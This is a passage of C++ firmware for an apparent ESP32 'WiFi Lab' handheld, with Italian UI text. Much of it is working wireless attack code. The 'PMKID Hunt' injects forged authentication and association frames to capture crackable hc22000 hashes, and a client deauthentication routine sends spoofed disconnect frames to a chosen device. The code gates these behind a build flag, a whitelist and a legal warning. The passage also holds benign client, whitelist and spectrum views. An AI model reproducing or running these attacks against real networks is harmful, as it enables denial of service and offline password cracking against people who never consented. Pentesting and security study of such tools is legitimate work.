    frame[n++] = 0x00;  // SSID IE
    frame[n++] = target.ap.ssidLen;
    if (target.ap.ssidLen > 0) {
        std::memcpy(frame + n, target.ap.ssid, target.ap.ssidLen);
        n += target.ap.ssidLen;
    }
    static const uint8_t kRates[8] = {0x82, 0x84, 0x8B, 0x96,
                                      0x0C, 0x12, 0x18, 0x24};
    frame[n++] = 0x01;
    frame[n++] = 8;
    std::memcpy(frame + n, kRates, 8);
    n += 8;
    static const uint8_t kExtRates[4] = {0x30, 0x48, 0x60, 0x6C};
    frame[n++] = 0x32;
    frame[n++] = 4;
    std::memcpy(frame + n, kExtRates, 4);
    n += 4;
    if (!open) {
        static const uint8_t kRsn[22] = {
            0x30, 0x14, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04,
            0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00,
            0x00, 0x0F, 0xAC, 0x02, 0x00, 0x00,
        };
        std::memcpy(frame + n, kRsn, sizeof(kRsn));
        n += sizeof(kRsn);
    }
    return esp_wifi_80211_tx(WIFI_IF_STA, frame, n, false) == ESP_OK;
}

bool g_huntCancel = false;

void driveTarget(PmkidTarget& target) {
    if (apWhitelisted(target.ap)) {
        target.state = HuntFailed;
        return;
    }
    const uint8_t channel = target.ap.channel >= 1 && target.ap.channel <= 13
                                ? target.ap.channel
                                : static_cast<uint8_t>(1);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (!target.hasPmkid) {
        // Dopo il PMKID non serve altro TX: resta in ascolto per il beacon
        // che fornisce l'ESSID.
        if (sendAuth(target)) {
            delay(8);
            if (!sendAssoc(target)) {
                ++target.txFail;
            }
        } else {
            ++target.txFail;
        }
    }
    ++target.rounds;

    const uint32_t until = millis() + 200;
    while (static_cast<int32_t>(millis() - until) < 0) {
        navigation::update();
        if (navigation::poll().type == navigation::Event::Back) {
            g_huntCancel = true;
            return;
        }
        drainPmkidRx();
        delay(4);
    }

    if (target.hasPmkid && !target.hcSaved) {
        savePmkidFile(target);
    }
    if (target.hasPmkid) {
        target.state = target.hcSaved ? HuntFound : HuntNoEssid;
    } else if (target.m1Count >= 3 || target.rounds >= 10) {
        target.state = HuntFailed;
    } else if (target.m1Count > 0) {
        target.state = HuntM1;
    }
}

void drawHunt(uint32_t start) {
    display::clear();
    display::header("PMKID Hunt", "WiFi Lab");
    uint32_t m1 = 0;
    uint32_t txFail = 0;
    for (int i = 0; i < g_targetCount; ++i) {
        m1 += g_targets[i].m1Count;
        txFail += g_targets[i].txFail;
    }
    char line[64];
    const uint32_t elapsed = (millis() - start) / 1000;
    std::snprintf(line, sizeof(line), "%lus M1:%lu KO:%lu persi:%lu",
                  static_cast<unsigned long>(elapsed),
                  static_cast<unsigned long>(m1),
                  static_cast<unsigned long>(txFail),
                  static_cast<unsigned long>(g_rxDropped));
    display::text(6, 24, line, display::kTextDim, 0);

    for (int i = 0; i < g_targetCount; ++i) {
        const PmkidTarget& target = g_targets[i];
        const int y = 38 + i * 27;
        const uint16_t color = target.state == HuntFound
                                   ? display::kInfo
                                   : (target.state == HuntFailed
                                          ? display::kTextDim
                                          : display::kAccent);
        display::text(6, y, shorten(apSsid(target.ap), 22), color, 2);
        std::snprintf(line, sizeof(line), "%s  M1:%u  %s",
                      macText(target.ap.bssid).c_str(),
                      static_cast<unsigned>(target.m1Count),
                      huntStateName(target.state));
        display::text(6, y + 11, line, color, 0);
    }
    display::footer("ESC = interrompi");
    display::push();
}

void runPmkidHunt() {
    if (!storage::hasSD()) {
        ui::message("PMKID Hunt",
                    {"Serve una microSD per salvare", "i file in /wifilab/pmkid/."},
                    "WiFi Lab");
        return;
    }
    loadWhitelist();
    if (!whitelistReady()) {
        ui::message("PMKID Hunt",
                    {"Whitelist assente o > 4 KB.", "Attacchi bloccati.",
                     "Crea /wifilab/whitelist.txt", "da WiFi Lab > Whitelist."},
                    "WiFi Lab");
        return;
    }
    if (!ui::legalWarning("PMKID Hunt",
                          {"Scansione AP e invio auth/assoc.",
                           "Attesa del messaggio M1 con PMKID."},
                          "WiFi Lab")) {
        return;
    }
    if (!scanAps("WiFi Lab")) {
        ui::message("PMKID Hunt", {"Scansione annullata o fallita."},
                    "WiFi Lab");
        return;
    }
    if (g_apCount == 0) {
        ui::message("PMKID Hunt", {"Nessun AP trovato."}, "WiFi Lab");
        return;
    }


    bool marked[kMaxAps] = {};
    int chosen = 0;
    int selected = 0;
    int top = 0;
    constexpr int kVisible = 5;
    constexpr int kRowH = 18;
    navigation::waitRelease();
    while (true) {
        navigation::update();
        const navigation::EventData ev = navigation::poll();
        if (ev.type == navigation::Event::Back) {
            return;
        }
        if (ev.type == navigation::Event::Up) {
            selected = (selected + g_apCount - 1) % g_apCount;
        } else if (ev.type == navigation::Event::Down) {
            selected = (selected + 1) % g_apCount;
        } else if (ev.type == navigation::Event::Select) {
            if (apWhitelisted(g_aps[selected])) {
                ui::message("PMKID Hunt",
                            {"Rete in whitelist:", apSsid(g_aps[selected]),
                             "Esclusa dagli attacchi."},
                            "WiFi Lab");
            } else if (marked[selected]) {
                marked[selected] = false;
                --chosen;
            } else if (chosen < kMaxTargets) {
                marked[selected] = true;
                ++chosen;
            } else {
                ui::message("PMKID Hunt",
                            {"Massimo 3 target in RAM.", "Deseleziona un AP."},
                            "WiFi Lab");
            }
        } else if (ev.type == navigation::Event::Text &&
                   (ev.ch == 's' || ev.ch == 'S') && chosen > 0) {
            break;
        }

        if (selected < top) {
            top = selected;
        } else if (selected >= top + kVisible) {
            top = selected - kVisible + 1;
        }

        display::clear();
        display::header("Scegli target", "WiFi Lab");
        char line[64];
        std::snprintf(line, sizeof(line), "Selezionati %d/3", chosen);
        display::text(6, 24, line, display::kTextDim, 0);
        for (int row = 0; row < kVisible; ++row) {
            const int index = top + row;
            if (index >= g_apCount) {
                break;
            }
            const ApInfo& ap = g_aps[index];
            const int y = 36 + row * kRowH;
            const bool isSelected = index == selected;
            const bool isWhite = apWhitelisted(ap);
            if (isSelected) {
                display::g().fillRoundRect(2, y, display::width() - 6,
                                           kRowH - 1, 3, display::kAccentDark);
            }
            std::snprintf(line, sizeof(line), "[%c] %s ch%u %d",
                          marked[index] ? 'x' : ' ',
                          shorten(apSsid(ap), 17).c_str(),
                          static_cast<unsigned>(ap.channel),
                          static_cast<int>(ap.rssi));
            display::text(6, y + 5, line,
                          isSelected ? display::kWhite : display::kText, 0);
            if (isWhite) {
                display::text(display::width() - 22, y + 5, "WL",
                              display::kWarning, 0);
            }
        }
        display::footer("INVIO=sel  S=avvia  ESC=indietro");
        display::push();
        delay(25);
    }

    storage::mkdir("/wifilab", true);
    storage::mkdir(kPmkidDir, true);
    g_targetCount = 0;
    for (int i = 0; i < g_apCount && g_targetCount < kMaxTargets; ++i) {
        if (!marked[i] || apWhitelisted(g_aps[i]) ||
            !validBssid(g_aps[i].bssid)) {
            continue;
        }
        PmkidTarget& target = g_targets[g_targetCount];
        target = PmkidTarget{};
        target.ap = g_aps[i];
        // Un vecchio hash dello stesso BSSID non deve sembrare il risultato
        // di questa sessione.
        if (!removePmkidFile(target.ap.bssid)) {
            ui::message("PMKID Hunt",
                        {"!Impossibile rimuovere il", "vecchio hash hc22000.",
                         "Controlla la microSD."},
                        "WiFi Lab");
            return;
        }
        randomStaMac(target.sta, g_targetCount);
        ++g_targetCount;
    }
    if (g_targetCount == 0) {
        return;
    }
    g_rxBssidCount = 0;
    for (int i = 0; i < g_targetCount; ++i) {
        std::memcpy(g_rxBssids[i], g_targets[i].ap.bssid, 6);
        g_rxBssidCount = static_cast<uint8_t>(i + 1);
    }

    if (!startRx(RxPmkid)) {
        ui::message("PMKID Hunt",
                    {"Modalita' promiscua non disponibile."}, "WiFi Lab");
        return;
    }
    RxGuard guard(true);
    for (int i = 0; i < g_targetCount; ++i) {
        openTargetPcap(g_targets[i]);
    }

    g_huntCancel = false;
    const uint32_t start = millis();
    uint32_t lastDraw = 0;
    while (!g_huntCancel && millis() - start < 120000) {
        bool active = false;
        for (int i = 0; i < g_targetCount && !g_huntCancel; ++i) {
            PmkidTarget& target = g_targets[i];
            if (target.state == HuntFound || target.state == HuntFailed) {
                continue;
            }
            // PMKID trovato ma ESSID assente: resta in ascolto per qualche
            // finestra, senza trasmettere, nella speranza di un beacon.
            if (target.state == HuntNoEssid && target.rounds >= 6) {
                continue;
            }
            active = true;
            driveTarget(target);
            const uint32_t now = millis();
            if (now - lastDraw > 180) {
                drawHunt(start);
                lastDraw = now;
            }
        }
        if (!active) {
            break;
        }
    }

    guard.stop();
    closeTargetPcaps();

    int found = 0;
    int saved = 0;
    int txFail = 0;
    bool writeError = false;
    bool pcapError = false;
    std::vector<std::string> lines;
    for (int i = 0; i < g_targetCount; ++i) {
        if (g_targets[i].hasPmkid) {
            ++found;
        }
        if (g_targets[i].hcSaved) {
            ++saved;
        }
        txFail += g_targets[i].txFail;
        if (!g_targets[i].pcapOk) {
            pcapError = true;
        }
        if (g_targets[i].hasPmkid && !g_targets[i].hcSaved) {
            writeError = true;
        }
    }
    lines.push_back("Target: " + std::to_string(g_targetCount) +
                    "  PMKID: " + std::to_string(found) +
                    "  salvati: " + std::to_string(saved));
    for (int i = 0; i < g_targetCount; ++i) {
        const PmkidTarget& target = g_targets[i];
        lines.push_back(std::string(target.hcSaved ? ">" : "!") +
                        shorten(apSsid(target.ap), 18) + ": " +
                        (target.hcSaved ? "salvato"
                                        : huntStateName(target.state)));
    }
    lines.push_back("File: /wifilab/pmkid/");
    if (txFail > 0) {
        lines.push_back("TX rifiutati: " + std::to_string(txFail));
    }
    if (writeError || pcapError) {
        lines.push_back("!Errore SD, ESSID assente o pcap:");
        lines.push_back("output incompleto, controlla la card.");
    }
    ui::message("PMKID Hunt", lines, "WiFi Lab");
}
#else
void runPmkidHunt() {
    ui::message("PMKID Hunt",
                {"Funzione offensiva non compilata.", "Usa la build",
                 "cardputer-adv-offensive.", "Nessun frame viene inviato."},
                "WiFi Lab");
}
#endif  // ENABLE_OFFENSIVE

// ---------------------------------------------------------------------------
// Client Monitor
// ---------------------------------------------------------------------------

struct ClientInfo {
    uint8_t mac[6] = {};
    int8_t rssi = 0;
    uint16_t frames = 0;
    uint32_t lastSeen = 0;
};

struct OuiEntry {
    uint8_t oui[3];
    const char* name;
};

const OuiEntry kOuis[] = {
    {{0x00, 0x03, 0x93}, "Apple"},     {{0x00, 0x1B, 0x63}, "Apple"},
    {{0x3C, 0x22, 0xFB}, "Apple"},     {{0xF0, 0x18, 0x98}, "Apple"},
    {{0xA4, 0x83, 0xE7}, "Apple"},     {{0x00, 0x12, 0xFB}, "Samsung"},
    {{0x8C, 0x77, 0x12}, "Samsung"},   {{0xE8, 0x50, 0x8B}, "Samsung"},
    {{0x00, 0x1B, 0x21}, "Intel"},     {{0x3C, 0x97, 0x0E}, "Intel"},
    {{0x8C, 0x16, 0x45}, "Intel"},     {{0x7C, 0x7A, 0x91}, "Intel"},
    {{0x24, 0x0A, 0xC4}, "Espressif"}, {{0x30, 0xAE, 0xA4}, "Espressif"},
    {{0x3C, 0x61, 0x05}, "Espressif"}, {{0x7C, 0xDF, 0xA1}, "Espressif"},
    {{0x84, 0xCC, 0xA8}, "Espressif"}, {{0xA4, 0xCF, 0x12}, "Espressif"},
    {{0xC4, 0x4F, 0x33}, "Espressif"}, {{0xD8, 0xA0, 0x1D}, "Espressif"},
    {{0xEC, 0x62, 0x60}, "Espressif"}, {{0xAC, 0x67, 0xB2}, "Espressif"},
    {{0x00, 0xE0, 0xFC}, "Huawei"},    {{0x48, 0x46, 0xFB}, "Huawei"},
    {{0x34, 0xCE, 0x00}, "Xiaomi"},    {{0x50, 0x8F, 0x4C}, "Xiaomi"},
    {{0x78, 0x11, 0xDC}, "Xiaomi"},    {{0x8C, 0xBE, 0xBE}, "Xiaomi"},
    {{0x14, 0xCC, 0x20}, "TP-Link"},   {{0x50, 0xC7, 0xBF}, "TP-Link"},
    {{0x98, 0xDA, 0xC4}, "TP-Link"},   {{0xC0, 0x25, 0xE9}, "TP-Link"},
    {{0x00, 0x00, 0x0C}, "Cisco"},     {{0x00, 0x1A, 0xA1}, "Cisco"},
    {{0x3C, 0x5A, 0xB4}, "Google"},    {{0xF4, 0xF5, 0xD8}, "Google"},
    {{0x44, 0x65, 0x0D}, "Amazon"},    {{0x74, 0xC2, 0x46}, "Amazon"},
    {{0x00, 0x12, 0x5A}, "Microsoft"}, {{0x7C, 0x1E, 0x52}, "Microsoft"},
    {{0xB8, 0x27, 0xEB}, "Raspberry"}, {{0xDC, 0xA6, 0x32}, "Raspberry"},
    {{0x00, 0x0E, 0x58}, "Sonos"},     {{0x00, 0x09, 0xBF}, "Nintendo"},
    {{0x00, 0x13, 0xA9}, "Sony"},      {{0x00, 0x1E, 0x75}, "LG"},
    {{0x00, 0x14, 0x6C}, "Netgear"},   {{0x9C, 0x3D, 0xCF}, "Netgear"},
    {{0x00, 0x1B, 0xFC}, "Asus"},      {{0x2C, 0x56, 0xDC}, "Asus"},
    {{0x00, 0x15, 0x6D}, "Ubiquiti"},  {{0x24, 0xA4, 0x3C}, "Ubiquiti"},
    {{0x00, 0x17, 0x88}, "Philips"},   {{0x00, 0x1A, 0x1E}, "D-Link"},
};

const char* ouiVendor(const uint8_t mac[6]) {
    if (mac[0] & 0x02) {
        return "random";
    }
    for (const OuiEntry& entry : kOuis) {
        if (entry.oui[0] == mac[0] && entry.oui[1] == mac[1] &&
            entry.oui[2] == mac[2]) {
            return entry.name;
        }
    }
    return "sconosciuto";
}

ClientInfo g_clients[kMaxClients];
int g_clientCount = 0;
constexpr uint32_t kClientMaxAgeMs = 120000;

void ageClients() {
    const uint32_t now = millis();
    int keep = 0;
    for (int i = 0; i < g_clientCount; ++i) {
        if (now - g_clients[i].lastSeen <= kClientMaxAgeMs) {
            if (keep != i) {
                g_clients[keep] = g_clients[i];
            }
            ++keep;
        }
    }
    g_clientCount = keep;
}

void mergeObservation(const ClientObs& obs) {
    const uint32_t now = millis();
    for (int i = 0; i < g_clientCount; ++i) {
        if (sameMac(g_clients[i].mac, obs.mac)) {
            g_clients[i].rssi = obs.rssi;
            g_clients[i].lastSeen = now;
            if (g_clients[i].frames < 0xFFFF) {
                ++g_clients[i].frames;
            }
            return;
        }
    }
    int slot = g_clientCount;
    if (g_clientCount >= kMaxClients) {
        // Tabella piena: sostituisce il client visto meno di recente.
        slot = 0;
        for (int i = 1; i < g_clientCount; ++i) {
            if (g_clients[i].lastSeen < g_clients[slot].lastSeen) {
                slot = i;
            }
        }
    } else {
        ++g_clientCount;
    }
    ClientInfo& client = g_clients[slot];
    std::memcpy(client.mac, obs.mac, 6);
    client.rssi = obs.rssi;
    client.frames = 1;
    client.lastSeen = now;
}

bool findClient(const uint8_t mac[6], ClientInfo& out) {
    for (int i = 0; i < g_clientCount; ++i) {
        if (sameMac(g_clients[i].mac, mac)) {
            out = g_clients[i];
            return true;
        }
    }
    return false;
}

void drainClientRx() {
    ageClients();
    for (int guard = 0; guard < kObsSlots; ++guard) {
        ClientObs obs;
        bool have = false;
        portENTER_CRITICAL(&g_obsMux);
        if (g_obsTail != g_obsHead) {
            obs = g_observations[g_obsTail];
            g_obsTail = (g_obsTail + 1) % kObsSlots;
            have = true;
        }
        portEXIT_CRITICAL(&g_obsMux);
        if (!have) {
            return;
        }
        mergeObservation(obs);
    }
}

void drawClientMonitor(const ApInfo& ap, int selected, int top) {
    display::clear();
    display::header("Client Monitor", "WiFi Lab");
    char line[40];
    std::snprintf(line, sizeof(line), "%s  ch%u",
                  shorten(apSsid(ap), 18).c_str(),
                  static_cast<unsigned>(ap.channel));
    display::text(6, 24, line, display::kAccent, 2);
    std::snprintf(line, sizeof(line), "Client: %d/%d %s", g_clientCount,
                  kMaxClients, bssidWhitelisted(ap.bssid) ? " WL" : "");
    display::text(6, 36, line, display::kTextDim, 0);
    display::text(6, 48, "MAC", display::kTextDim, 0);
    display::text(112, 48, "RSSI", display::kTextDim, 0);
    display::text(142, 48, "VENDOR", display::kTextDim, 0);

    if (g_clientCount == 0) {
        display::text(6, 64, "In attesa di traffico dati...",
                      display::kTextDim, 0);
        display::text(6, 78, "I client compaiono quando", display::kTextDim, 0);
        display::text(6, 88, "l'AP scambia frame con loro.",
                      display::kTextDim, 0);
    }

    constexpr int kRows = 5;
    for (int row = 0; row < kRows; ++row) {
        const int index = top + row;
        if (index >= g_clientCount) {
            break;
        }
        const int y = 56 + row * 13;
        const bool isSelected = index == selected;
        if (isSelected) {
            display::g().fillRoundRect(2, y, display::width() - 6, 12, 2,
                                       display::kAccentDark);
        }
        const ClientInfo& client = g_clients[index];
        std::snprintf(line, sizeof(line), "%s", macText(client.mac).c_str());
        display::text(6, y + 2, line,
                      isSelected ? display::kWhite : display::kText, 0);
        std::snprintf(line, sizeof(line), "%d", static_cast<int>(client.rssi));
        display::text(112, y + 2, line,
                      isSelected ? display::kWhite : display::kTextDim, 0);
        display::text(142, y + 2, shorten(ouiVendor(client.mac), 16),
                      isSelected ? display::kWhite : display::kInfo, 0);
    }

#if ENABLE_OFFENSIVE
    const bool blocked = !whitelistReady() || bssidWhitelisted(ap.bssid) ||
                         apWhitelisted(ap);
    display::footer(blocked ? "deauth bloccato  ESC=esci"
                            : "D=deauth  ESC=esci");
#else
    display::footer("ESC=esci  deauth non compilato");
#endif
    display::push();
}

#if ENABLE_OFFENSIVE
void deauthClient(const ApInfo& ap, const uint8_t mac[6]) {
    if (!whitelistReady()) {
        ui::message("Deauth client",
                    {"Whitelist assente o > 4 KB.", "Azione bloccata."},
                    "Client Monitor");
        return;
    }
    if (bssidWhitelisted(ap.bssid) || apWhitelisted(ap)) {
        ui::message("Deauth client",
                    {"AP in whitelist.", "Azione bloccata."}, "Client Monitor");
        return;
    }
    ClientInfo preview;
    if (!findClient(mac, preview)) {
        ui::message("Deauth client",
                    {"Client non piu' in elenco.", "Riapri il monitor."},
                    "Client Monitor");
        return;
    }
    if (!ui::legalWarning("Deauth client",
                          {"Client: " + macText(preview.mac),
                           "AP: " + apSsid(ap)},
                          "Client Monitor")) {
        return;
    }
    // Dopo l'avviso: drena le osservazioni arrivate nel frattempo e ricostruisci
    // il client dallo stato corrente, senza riusare la copia pre-avviso.
    drainClientRx();
    ClientInfo client;
    if (!findClient(mac, client)) {
        ui::message("Deauth client",
                    {"Client non piu' visibile.", "Azione annullata."},
                    "Client Monitor");
        return;
    }
    if (millis() - client.lastSeen > 5000) {
        ui::message("Deauth client",
                    {"Client non piu' visibile", "negli ultimi 5 secondi."},
                    "Client Monitor");
        return;
    }

    esp_wifi_set_channel(ap.channel >= 1 && ap.channel <= 13
                             ? ap.channel
                             : static_cast<uint8_t>(1),
                         WIFI_SECOND_CHAN_NONE);
    uint8_t frame[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0,
        0x00, 0x00,
        0x07, 0x00,
    };
    std::memcpy(frame + 4, client.mac, 6);
    std::memcpy(frame + 10, ap.bssid, 6);
    std::memcpy(frame + 16, ap.bssid, 6);
    // Solo il client selezionato: niente broadcast, gli altri client e l'AP
    // restano associati.

    uint32_t sent = 0;
    uint32_t failed = 0;
    uint16_t seq = 0;
    navigation::waitRelease();
    for (int round = 0; round < 6; ++round) {
        for (int i = 0; i < 6; ++i) {
            frame[22] = static_cast<uint8_t>(seq & 0xFF);
            frame[23] = static_cast<uint8_t>(((seq >> 8) & 0x0F) << 4);
            ++seq;
            if (esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false) ==
                ESP_OK) {
                ++sent;
            } else {
                ++failed;
            }
            delay(3);
        }
        navigation::update();
        if (navigation::poll().type == navigation::Event::Back) {
            break;
        }
        display::clear();
        display::header("Deauth client", "Client Monitor");
        display::text(6, 28, macText(client.mac), display::kAccent, 2);
        char line[48];
        std::snprintf(line, sizeof(line), "Inviati %lu  KO %lu",
                      static_cast<unsigned long>(sent),
                      static_cast<unsigned long>(failed));
        display::text(6, 50, line, failed ? display::kWarning : display::kText,
                      0);
        display::progressBar(6, 68, 180, 8, (round + 1) / 6.0f,
                             display::kDanger);
        display::footer("ESC = interrompi");
        display::push();
        delay(140);
    }

    std::vector<std::string> lines;
    lines.push_back("Frame inviati: " + std::to_string(sent));
    if (failed > 0) {
        lines.push_back("!Rifiutati dal driver: " + std::to_string(failed));
        lines.push_back("Canale o regione non consentiti.");
    }
    lines.push_back("Client: " + macText(client.mac));
    ui::message("Deauth client", lines, "Client Monitor");
}
#endif  // ENABLE_OFFENSIVE

void runClientMonitor() {
    loadWhitelist();
    if (!scanAps("WiFi Lab", true)) {
        ui::message("Client Monitor", {"Scansione annullata o fallita."},
                    "WiFi Lab");
        return;
    }
    if (g_apCount == 0) {
        ui::message("Client Monitor", {"Nessun AP trovato."}, "WiFi Lab");
        return;
    }

    std::vector<std::string> labels;
    labels.reserve(static_cast<size_t>(g_apCount));
    for (int i = 0; i < g_apCount; ++i) {
        const ApInfo& ap = g_aps[i];
        labels.push_back(shorten(apSsid(ap), 14) + " ch" +
                         std::to_string(ap.channel) + " " +
                         std::to_string(static_cast<int>(ap.rssi)) + "dBm " +
                         securityName(ap.auth) +
                         (apWhitelisted(ap) ? " WL" : ""));
    }
    const int choice = chooseIndex("Scegli AP", "WiFi Lab", labels,
                                   "INVIO=monitora  ESC=indietro");
    if (choice < 0) {
        return;
    }
    const ApInfo target = g_aps[choice];

    g_clientCount = 0;
    std::memcpy(g_clientBssid, target.bssid, 6);
    if (!startRx(RxClients)) {
        ui::message("Client Monitor",
                    {"Modalita' promiscua non disponibile."}, "WiFi Lab");
        return;
    }
    RxGuard guard(true);
    esp_wifi_set_channel(target.channel >= 1 && target.channel <= 13
                             ? target.channel
                             : static_cast<uint8_t>(1),
                         WIFI_SECOND_CHAN_NONE);

    int selected = 0;
    int top = 0;
    uint8_t selectedMac[6] = {};
    bool hasSelection = false;
    uint32_t lastDraw = 0;
    navigation::waitRelease();
    while (true) {
        navigation::update();
        const navigation::EventData ev = navigation::poll();
        if (ev.type == navigation::Event::Back) {
            break;
        }
        drainClientRx();
        if (g_clientCount > 0 && hasSelection) {
            int found = -1;
            for (int i = 0; i < g_clientCount; ++i) {
                if (sameMac(g_clients[i].mac, selectedMac)) {
                    found = i;
                    break;
                }
            }
            if (found >= 0) {
                selected = found;
            } else {
                hasSelection = false;
            }
        }
        if (ev.type == navigation::Event::Up && g_clientCount > 0) {
            selected = (selected + g_clientCount - 1) % g_clientCount;
            hasSelection = true;
            std::memcpy(selectedMac, g_clients[selected].mac, 6);
        } else if (ev.type == navigation::Event::Down && g_clientCount > 0) {
            selected = (selected + 1) % g_clientCount;
            hasSelection = true;
            std::memcpy(selectedMac, g_clients[selected].mac, 6);
        } else if (ev.type == navigation::Event::Text &&
                   (ev.ch == 'd' || ev.ch == 'D')) {
            if (g_clientCount > 0 && hasSelection) {
#if ENABLE_OFFENSIVE
                deauthClient(target, selectedMac);
#else
                ui::message("Deauth client",
                            {"Funzione non compilata.", "Serve la build",
                             "cardputer-adv-offensive."},
                            "Client Monitor");
#endif
                lastDraw = 0;
            }
        }
        if (g_clientCount == 0) {
            selected = 0;
            top = 0;
            hasSelection = false;
        } else {
            if (selected >= g_clientCount) {
                selected = g_clientCount - 1;
            }
            if (!hasSelection) {
                hasSelection = true;
                std::memcpy(selectedMac, g_clients[selected].mac, 6);
            }
            if (selected < top) {
                top = selected;
            } else if (selected >= top + 5) {
                top = selected - 5 + 1;
            }
        }
        if (millis() - lastDraw > 180) {
            drawClientMonitor(target, selected, top);
            lastDraw = millis();
        }
        delay(15);
    }

    guard.stop();
}

// ---------------------------------------------------------------------------
// Whitelist
// ---------------------------------------------------------------------------

void drawWhitelist() {
    display::clear();
    display::header("Whitelist", "WiFi Lab");
    if (!whitelistReady()) {
        display::text(8, 30, "File assente o > 4 KB.",
                      display::kWarning, 0);
        display::text(8, 44, "PMKID e deauth sono bloccati",
                      display::kWarning, 0);
        display::text(8, 54, "finche' la whitelist non e' leggibile.",
                      display::kWarning, 0);
        display::text(8, 74, "File: /wifilab/whitelist.txt",
                      display::kTextDim, 0);
        display::text(8, 88, "Formato: BSSID|SSID", display::kTextDim, 0);
        display::text(8, 108, "A = aggiungi AP   N = file vuoto",
                      display::kAccent, 0);
    } else if (whitelistCount() == 0) {
        display::text(8, 30, "Nessuna voce.", display::kTextDim, 0);
        display::text(8, 46, "File: /wifilab/whitelist.txt",
                      display::kTextDim, 0);
        display::text(8, 60, "Formato: BSSID|SSID", display::kTextDim, 0);
        display::text(8, 80, "A = aggiungi un AP scansionato",
                      display::kAccent, 0);
    } else {
        display::text(6, 24, "Escluse da PMKID e deauth.  " +
                                 std::to_string(whitelistCount()) + "/" +
                                 std::to_string(kMaxWhitelist) +
                                 " voci",
                      display::kTextDim, 0);
        for (int i = 0; i < whitelistCount() && i < 6; ++i) {
            const netguard::Entry& entry = netguard::entry(i);
            const int y = 38 + i * 14;
            const std::string mac =
                entry.hasBssid ? macText(entry.bssid) : std::string("(solo SSID)");
            display::text(6, y, mac, display::kAccent, 0);
            display::text(120, y, entry.hasSsid ? shorten(entry.ssid, 18) : "-",
                          display::kText, 0);
        }
        if (whitelistCount() > 6) {
            display::text(6, 122, "...", display::kTextDim, 0);
        }
    }
    display::footer("A=aggiungi AP  N=file vuoto  ESC");
    display::push();
}

void addWhitelistFromScan() {
    if (!whitelistReady() && storage::exists(kWhitePath, true)) {
        ui::message("Whitelist",
                    {"File non valido, > 4 KB o", "con voci malformate.",
                     "Correggi /wifilab/whitelist.txt."},
                    "WiFi Lab");
        return;
    }
    if (whitelistCount() >= kMaxWhitelist) {
        ui::message("Whitelist",
                    {"Massimo 24 voci.", "Riduci il file a mano."},
                    "WiFi Lab");
        return;
    }
    if (!scanAps("WiFi Lab", true)) {
        return;
    }
    if (g_apCount == 0) {
        ui::message("Whitelist", {"Nessun AP trovato."}, "WiFi Lab");
        return;
    }
    std::vector<std::string> labels;
    labels.reserve(static_cast<size_t>(g_apCount));
    for (int i = 0; i < g_apCount; ++i) {
        labels.push_back(shorten(apSsid(g_aps[i]), 16) + "  " +
                         macText(g_aps[i].bssid) +
                         (apWhitelisted(g_aps[i]) ? "  WL" : ""));
    }
    const int choice = chooseIndex("Aggiungi AP", "WiFi Lab", labels,
                                   "INVIO=aggiungi  ESC=indietro");
    if (choice < 0) {
        return;
    }
    const ApInfo ap = g_aps[choice];
    if (apWhitelisted(ap)) {
        ui::message("Whitelist", {"AP gia' presente."}, "WiFi Lab");
        return;
    }
    if (!storage::hasSD()) {
        ui::message("Whitelist", {"Serve una microSD."}, "WiFi Lab");
        return;
    }
    if (addWhitelistEntry(ap)) {
        ui::message("Whitelist",
                    {"Aggiunto:", shorten(apSsid(ap), 24),
                     macText(ap.bssid)},
                    "WiFi Lab");
    } else {
        ui::message("Whitelist", {"!Scrittura non riuscita."}, "WiFi Lab");
    }
}

void runWhitelist() {
    loadWhitelist();
    navigation::waitRelease();
    uint32_t lastDraw = 0;
    while (true) {
        navigation::update();
        const navigation::EventData ev = navigation::poll();
        if (ev.type == navigation::Event::Back) {
            break;
        }
        if (ev.type == navigation::Event::Text &&
            (ev.ch == 'a' || ev.ch == 'A')) {
            addWhitelistFromScan();
            lastDraw = 0;
        } else if (ev.type == navigation::Event::Text &&
                   (ev.ch == 'n' || ev.ch == 'N')) {
            if (!storage::exists(kWhitePath, true) &&
                ui::confirm("Whitelist",
                            {"Creare un file vuoto?", "Nessuna rete sara'",
                             "esclusa dagli attacchi."},
                            "WiFi Lab")) {
                storage::mkdir("/wifilab", true);
                if (storage::writeText(kWhitePath, "", true)) {
                    loadWhitelist();
                }
            }
            lastDraw = 0;
        }
        if (millis() - lastDraw > 300) {
            drawWhitelist();
            lastDraw = millis();
        }
        delay(20);
    }
}

// ---------------------------------------------------------------------------
// Spettro 2.4 GHz
// ---------------------------------------------------------------------------

uint8_t g_waterfall[kWaterfallRows][kChannels] = {};
int g_wfHead = 0;
int g_wfCount = 0;
uint32_t g_specPeaks[kChannels] = {};

uint16_t levelColor(uint8_t level) {
    switch (level) {
        case 1:
            return display::kAccentDark;
        case 2:
            return display::kInfo;
        case 3:
            return display::kAccent;
        case 4:
            return display::kWarning;
        default:
            return display::kBackground;
    }
}

void drawSpectrum(const uint32_t counts[kChannels], uint32_t pps,
                  uint32_t total, uint8_t currentChannel) {
    display::clear();
    display::header("Spettro 2.4", "WiFi Lab");
    char line[48];
    std::snprintf(line, sizeof(line), "PPS %lu  ch%u",
                  static_cast<unsigned long>(pps),
                  static_cast<unsigned>(currentChannel));
    display::text(6, 24, line, display::kText, 0);
    std::snprintf(line, sizeof(line), "tot %lu", static_cast<unsigned long>(total));
    display::text(150, 24, line, display::kTextDim, 0);

    uint32_t scale = 1;
    uint32_t peakScale = 1;
    for (int i = 0; i < kChannels; ++i) {
        scale = std::max(scale, counts[i]);
        peakScale = std::max(peakScale, g_specPeaks[i]);
    }

    constexpr int kBarTop = 34;
    constexpr int kBarHeight = 38;
    for (int i = 0; i < kChannels; ++i) {
        const int x = 6 + i * 17;
        display::g().drawRect(x, kBarTop, 13, kBarHeight, display::kPanel);
        const int height = static_cast<int>(
            static_cast<uint64_t>(counts[i]) * kBarHeight / scale);
        if (height > 0) {
            display::g().fillRect(x + 1, kBarTop + kBarHeight - height, 11,
                                  height, display::kInfo);
        }
        // Il peak hold usa una scala propria: le barre restano legate ai
        // conteggi correnti.
        const int peak = static_cast<int>(
            static_cast<uint64_t>(g_specPeaks[i]) * kBarHeight / peakScale);
        if (peak > 0) {
            display::g().fillRect(x + 1, kBarTop + kBarHeight - peak, 11, 1,
